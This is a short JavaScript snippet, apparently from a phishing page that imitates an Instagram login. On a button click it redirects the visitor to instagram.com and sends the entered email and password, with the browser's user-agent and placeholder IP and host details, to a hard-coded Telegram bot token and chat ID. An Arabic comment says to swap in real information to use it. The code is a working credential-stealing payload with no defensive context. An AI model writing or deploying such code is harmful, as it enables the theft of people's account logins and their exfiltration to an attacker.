<script>
      
      
ADD.addEventListener('click', () => {
  window.location.href = 'https://instagram.com';         
var text = `email: ${email.value} 
password:  ${password.value}`; 

// معلومات ثابتة للتمثيل، قم بتغييرها بمعلومات حقيقية إذا كنت ترغب في استخدامها
const ip = '192.168.1.1';
const hostname = 'example.com';

// جمع معلومات المتصفح
const userAgent = navigator.userAgent;

text += `
|---------------|Info|-------------------|
IP      : ${ip}
HOST    : ${hostname}
BROWSER : ${userAgent}
|----------|By KaKarout|--------------|
`;

const botToken = '6843184165:AAFylsEek_Z5PjBjThXYjKHCxy8zL_fIu_c'; 
const chatId = '6669693805'; 
const message = text; 

fetch("https://api.telegram.org/bot" + botToken + "/sendMessage", { 
  method: 'POST', 
  headers: { 
      'Content-Type': 'application/json' 
  }, 
  body: JSON.stringify({ 
      chat_id: chatId, 
      text: message 
  }) 
}) 
.then(response => { 
  if (response.ok) { 
      alert('Message sent successfully'); 
  } else { 
      alert('Failed to send message'); 
  } 
}) 
.catch(error => { 
  alert('Error:', error); 
}); 
});

</script>